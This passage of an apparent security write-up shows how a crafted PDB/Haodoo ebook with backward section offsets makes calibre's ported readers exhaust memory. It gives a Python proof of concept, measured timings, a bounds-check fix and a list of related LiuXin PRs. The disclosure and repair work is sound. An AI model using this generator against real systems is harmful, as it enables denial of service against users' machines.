eReader metadata readers read them one at a time. In conversion, the eReader,
Haodoo, PalmDOC and zTXT readers keep every section too.

```python
# pdb_sections.py: run with calibre-debug -e pdb_sections.py
# A Haodoo book whose section offsets go back, so each section reads to the end
# of the file. Watch the memory: it grows by the file's size for every section.
import io
import resource
import struct
import time

from calibre.ebooks.metadata.pdb import get_metadata


def book(sections, size):
    record0 = '書'.encode('cp950') + b'\x1b1\x1b' + '章'.encode('cp950')
    first = 78 + 8 * (sections + 1) + 2
    start = first + len(record0)
    offsets = [first] + [start + sections - i for i in range(1, sections)] + [start + sections + 1]
    header = b'T'.ljust(32, b'\0') + bytes(28) + b'BOOKMTIT' + struct.pack('>IIH', 0, 0, sections + 1)
    table = b''.join(struct.pack('>LL', offset, 0) for offset in offsets)
    return header + table + b'\0\0' + record0 + b'\0' * (sections + 1) + b'\0' * size


for sections in (1_000, 2_000, 4_000):
    data = book(sections, 500_000)
    start = time.monotonic()
    get_metadata(io.BytesIO(data))
    rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 1024
    print(f'{sections} sections, {len(data):,} bytes: {time.monotonic() - start:.2f} s, peak {rss} MB', flush=True)
```

**Measured** (calibre's PDB readers, as ported, with LiuXin's fix switched off):

| Sections | Bytes | Time | Peak memory |
|---|---|---|---|
| 1,000 | 509,096 | 0.31 s | 507 MB |
| 2,000 | 518,096 | 0.54 s | 985 MB |
| 4,000 | 536,096 | 1.40 s | 1.9 GB |

A table of 65,535 sections takes 524 KB, so a file of about a megabyte would
hold over 60 GB (extrapolated, not run).

**Suggested fix:** check the table once, as bug 8's fix does for MOBI. LiuXin's
port adds this to `PdbHeaderReader` and calls it from `section_data`:

```python
def check_sections(self) -> None:
    if getattr(self, 'sections_checked', False):
        return
    self.stream.seek(0, 2)
    size = self.stream.tell()
    self.stream.seek(78)
    table = self.stream.read(8 * self.num_sections)
    offsets = [struct.unpack_from('>L', table, 8 * i)[0] for i in range(len(table) // 8)]
    held = 0
    for i, start in enumerate(offsets):
        end = offsets[i + 1] if i + 1 < len(offsets) else size
        held += (size if end < start else min(end, size)) - min(start, size)
    if held > 2 * size:
        raise ValueError('PDB sections overlap')
    self.sections_checked = True
```

Books whose sections are in order read exactly as before. Refusing any offset
that goes back, as LiuXin's own PDB reader does, would also do, and would
refuse damaged files calibre reads today.

## LiuXin's own fixes

- PR #180 fixes LiuXin's readers on `main`: `metadata/file_sources/topaz.py`
  (whose counts could reach 2**56, as it reads up to 8 bytes) and
  `metadata/file_sources/rtf.py`.
- PR #179 carries the same fixes in the ported calibre readers under
  `metadata/upstream_calibre/`, each line marked `# LiuXin:`.
- PR #186 fixes the same comment pattern in LiuXin's HTML reader on `main`
  (`metadata/file_sources/html.py`), which has no length cap, so a 1 MB comment
  would have taken hours. PR #185 carries the fix in the ported HTML reader.
- PR #188 carries fixes for bugs 5 to 10 in the ported `chardet` and MOBI
  readers. On `main`, PR #190 fixes bug 5 in LiuXin's own
  `utils/libraries/calibre_chardet.py`, and PR #191 fixes bugs 9 and 10 in its
  own MOBI 6 reader (`file_formats/mobi/reader/mobi6.py`). LiuXin's readers
  never had bugs 6 to 8: its EXTH reader refuses a record of size 0, its
  HUFF/CDIC reader caps each record's output, and its PalmDB reader refuses
  offsets that go back.
- PR #193 fixes bug 11 in LiuXin's conversion code on `main`: the HTML
  preprocessor, the heuristic processor and the LRF converter.
- PR #195 carries the fix for bug 12 in the ported PDB reader. LiuXin's own
  PDB header reader never had it: it refuses offsets that do not increase.

Return to the [calibre compatibility index](README.md).
